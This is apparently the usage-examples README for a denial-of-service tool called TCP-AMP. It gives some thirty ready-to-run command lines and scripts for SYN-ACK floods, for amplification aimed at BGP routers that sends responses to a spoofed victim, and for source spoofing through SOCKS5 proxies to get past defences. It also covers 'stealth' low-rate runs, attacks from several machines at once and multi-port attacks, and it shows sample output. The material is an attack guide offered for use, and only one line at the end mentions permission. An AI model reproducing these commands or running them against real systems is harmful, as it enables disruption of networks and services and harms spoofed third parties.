# Usage Examples

This document provides practical examples of using the TCP-AMP (SYN-ACK Flood with BGP Amplification) tool.

## Basic Examples

### Example 1: Simple SYN-ACK Flood

Basic SYN-ACK flood attack:

```bash
sudo ./amp 192.168.1.100 80 100 30 50000
```

**Breakdown:**
- Target: `192.168.1.100:80`
- Threads: 100
- Duration: 30 seconds
- Max PPS: 50,000
- Mode: SYN-ACK flood (both SYN and ACK flags set)

**Expected Output:**
```
[+] Starting 100 threads with SYN-ACK FLOOD
[+] Target: 192.168.1.100:80
[+] Maximum PPS: 50000
[*] Attack: 100% SYN-ACK packets with random TCP options (MSS, Window Scale, Timestamp)
[*] Running for 30 seconds...

[LIVE] PPS: 48500 | Sent: 1455000 | Failed: 250 | Mbps: 2.91
```

### Example 2: BGP Amplification Attack

Target BGP router with amplification:

```bash
sudo ./amp 192.168.1.100 179 200 60 100000 --bgp
```

**Breakdown:**
- Target: `192.168.1.100:179` (BGP port)
- Threads: 200
- Duration: 60 seconds
- Max PPS: 100,000
- Mode: SYN-ACK flood + BGP amplification

**Expected Output:**
```
[+] Starting 200 threads with SYN-ACK FLOOD + BGP AMPLIFICATION
[+] Target: 192.168.1.100:179
[+] Maximum PPS: 100000
[*] Attack: 100% SYN-ACK packets with random TCP options (MSS, Window Scale, Timestamp)
[*] BGP Amplification: Enabled (targeting BGP routers for amplification)
[*] Running for 60 seconds...

[LIVE] PPS: 95000 | Sent: 5700000 | Failed: 500 | BGP-AMP: ON | Mbps: 10.64
```

**Note:** BGP amplification adds 79 bytes of BGP payload, increasing packet size from ~60 bytes to ~140 bytes.

### Example 3: High-Intensity Attack

Maximum intensity SYN-ACK flood:

```bash
sudo ./amp 10.0.0.1 443 1000 300 500000
```

**Warning:** This uses 1000 threads and 500k PPS. Ensure your system can handle this load.

### Example 4: SSH Port Attack

Target SSH service with SYN-ACK:

```bash
sudo ./amp 192.168.1.50 22 200 60 100000
```

## BGP Amplification Examples

### Example 5: BGP Router Stress Test

Test BGP router resilience:

```bash
sudo ./amp 203.0.113.1 179 500 120 200000 --bgp
```

**What happens:**
- Sends SYN-ACK packets with BGP OPEN messages
- BGP router processes BGP messages
- Router responds with BGP UPDATE messages (large)
- Responses sent to spoofed source IP (victim)
- Amplification effect: Small request → Large response

### Example 6: BGP Amplification

BGP amplification works best when targeting BGP port 179:

```bash
sudo ./amp 192.168.1.100 179 300 60 150000 --bgp
```

**Note:** BGP payload is automatically added when `--bgp` flag is set and target port is 179.

### Example 7: Combined BGP + High Intensity

Maximum BGP amplification:

```bash
sudo ./amp 192.168.1.100 179 1000 300 500000 --bgp
```

## SOCKS5 Proxy Examples

### Example 8: Using SOCKS5 Proxies

1. Create `socks5.txt`:
```
192.168.1.100:1080
192.168.1.101:1080:user:pass
proxy.example.com:1080
```

2. Run with proxy support:
```bash
sudo ./amp 192.168.1.200 80 500 120 200000 --socks5
```

**Output:**
```
[+] Loaded 3 SOCKS5 proxies from socks5.txt
[+] Starting 500 threads with PROXIED RAW SOCKET SYN-ACK FLOOD
[*] Mode: Proxied Raw Socket (proxy IP spoofing + random TCP options)
[*] Proxies: 3 loaded (used as spoofed source IPs)
```

### Example 9: Proxy with Authentication

If your proxies require authentication:

```
# socks5.txt
proxy1.com:1080:username1:password1
proxy2.com:1080:username2:password2
```

Run:
```bash
sudo ./amp 192.168.1.200 443 300 60 150000 --socks5
```

### Example 10: BGP Amplification + SOCKS5

Combine both features:

```bash
sudo ./amp 192.168.1.100 179 500 120 200000 --socks5 --bgp
```

**Benefits:**
- Proxy IP spoofing for source IP diversity
- BGP payload for amplification
- Maximum bypass potential

## Advanced Scenarios

### Example 11: Long-Duration Test

Run for extended period:

```bash
sudo ./amp 192.168.1.100 80 300 3600 100000
```

This runs for 1 hour (3600 seconds) with moderate intensity.

### Example 12: Low-Intensity Stealth Test

Low-intensity for stealth:

```bash
sudo ./amp 192.168.1.100 80 50 60 10000
```

**Use case:** Testing detection thresholds.

### Example 13: Port Scanning Simulation

Test multiple ports sequentially:

```bash
for port in 80 443 22 25 53; do
    echo "Testing port $port..."
    sudo ./amp 192.168.1.100 $port 100 10 50000
    sleep 5
done
```

### Example 14: Distributed Attack Simulation

Run on multiple machines:

**Machine 1:**
```bash
sudo ./amp 192.168.1.100 80 500 300 200000
```

**Machine 2:**
```bash
sudo ./amp 192.168.1.100 443 500 300 200000
```

**Machine 3:**
```bash
sudo ./amp 192.168.1.100 22 500 300 200000
```

## Performance Tuning

### Example 15: CPU-Optimized

For systems with many CPU cores:

```bash
sudo ./amp 192.168.1.100 80 2000 60 1000000
```

**Note:** Monitor CPU usage with `htop` to ensure system stability.

### Example 16: Memory-Constrained System

For systems with limited memory:

```bash
sudo ./amp 192.168.1.100 80 100 60 50000
```

Lower thread count reduces memory usage.

### Example 17: Network-Constrained

For limited bandwidth:

```bash
sudo ./amp 192.168.1.100 80 200 60 50000
```

Lower PPS reduces bandwidth usage.

## Scripts and Automation

### Example 18: Automated Test Script

Create `test_amp.sh`:

```bash
#!/bin/bash

TARGET="192.168.1.100"
PORTS=(80 443 22)
THREADS=200
DURATION=60
PPS=100000

for port in "${PORTS[@]}"; do
    echo "[*] Testing $TARGET:$port"
    sudo ./amp $TARGET $port $THREADS $DURATION $PPS
    sleep 10
done
```

Run:
```bash
chmod +x test_amp.sh
sudo ./test_amp.sh
```

### Example 19: BGP Router Discovery

Test multiple BGP routers:

```bash
#!/bin/bash

BGP_ROUTERS=(
    "203.0.113.1"
    "198.51.100.1"
    "192.0.2.1"
)

for router in "${BGP_ROUTERS[@]}"; do
    echo "[*] Testing BGP router: $router"
    sudo ./amp $router 179 300 60 150000 --bgp
    sleep 30
done
```

### Example 20: Continuous Monitoring

Run with continuous output:

```bash
sudo ./amp 192.168.1.100 80 300 3600 100000 | tee attack.log
```

This saves output to `attack.log` while displaying on screen.

## Troubleshooting Examples

### Example 21: Permission Issues

If you get "Permission denied":

```bash
# Check if running as root
whoami
# Should output: root

# If not root, use sudo
sudo ./amp 192.168.1.100 80 100 30 50000
```

### Example 22: Low Performance

If PPS is lower than expected:

```bash
# Check system limits
ulimit -n
# Should be high (1048576+)

# Increase if needed
ulimit -n 1048576

# Check CPU usage
htop

# Try increasing threads
sudo ./amp 192.168.1.100 80 500 60 200000
```

### Example 23: BGP Amplification Not Working

If BGP amplification doesn't seem to work:

```bash
# Verify --bgp flag is set
sudo ./amp 192.168.1.100 179 200 60 100000 --bgp

# Check packet size (should be ~140 bytes with BGP)
# Monitor with tcpdump
sudo tcpdump -i any -n 'host 192.168.1.100 and port 179' -c 10
```

## Real-World Scenarios

### Example 24: Web Server Stress Test

Test web server resilience:

```bash
sudo ./amp 192.168.1.100 80 500 300 200000
```

Monitor server response:
```bash
# On target server
watch -n 1 'netstat -an | grep :80 | wc -l'
```

### Example 25: BGP Router Resilience Test

Test BGP router under load:

```bash
sudo ./amp 192.168.1.100 179 1000 600 500000 --bgp
```

Monitor BGP router:
```bash
# On BGP router
show ip bgp summary
show ip bgp neighbors
```

### Example 26: Multi-Port Attack

Attack multiple ports simultaneously:

```bash
# Terminal 1
sudo ./amp 192.168.1.100 80 300 300 150000 &

# Terminal 2
sudo ./amp 192.168.1.100 443 300 300 150000 &

# Terminal 3
sudo ./amp 192.168.1.100 22 300 300 150000 &
```

## Best Practices

### Example 27: Gradual Ramp-Up

Start low and increase:

```bash
# Phase 1: Low intensity
sudo ./amp 192.168.1.100 80 100 30 10000

# Phase 2: Medium intensity
sudo ./amp 192.168.1.100 80 300 60 50000

# Phase 3: High intensity
sudo ./amp 192.168.1.100 80 500 120 200000
```

### Example 28: Monitoring During Attack

Monitor system resources:

```bash
# Terminal 1: Run attack
sudo ./amp 192.168.1.100 80 500 300 200000

# Terminal 2: Monitor system
watch -n 1 'echo "CPU:"; top -bn1 | grep "Cpu(s)" | head -1; echo "Memory:"; free -h; echo "Network:"; iftop -t -s 5'
```

### Example 29: Clean Shutdown

Stop attack gracefully:

```bash
# Press CTRL+C
# Tool will:
# - Stop all threads
# - Close all sockets
# - Display final statistics
# - Exit cleanly
```

## Comparison Examples

### Example 30: SYN vs SYN-ACK

**SYN Flood (traditional):**
- Only SYN flag set
- No ACK sequence
- Smaller packets (~60 bytes)

**SYN-ACK Flood (this tool):**
- Both SYN and ACK flags set
- ACK sequence included
- Similar packet size (~60 bytes)
- More realistic (simulates established connection)

### Example 31: With vs Without BGP

**Without BGP:**
```bash
sudo ./amp 192.168.1.100 179 200 60 100000
# Packet size: ~60 bytes
```

**With BGP:**
```bash
sudo ./amp 192.168.1.100 179 200 60 100000 --bgp
# Packet size: ~140 bytes
# Amplification: BGP responses can be 10-100x larger
```

## Notes

- Always test on systems you own or have permission to test
- Monitor system resources during high-intensity attacks
- BGP amplification works best on actual BGP routers (port 179)
- SOCKS5 proxies improve source IP diversity
- Higher thread counts require more CPU and memory
- BGP payload increases packet size and bandwidth usage

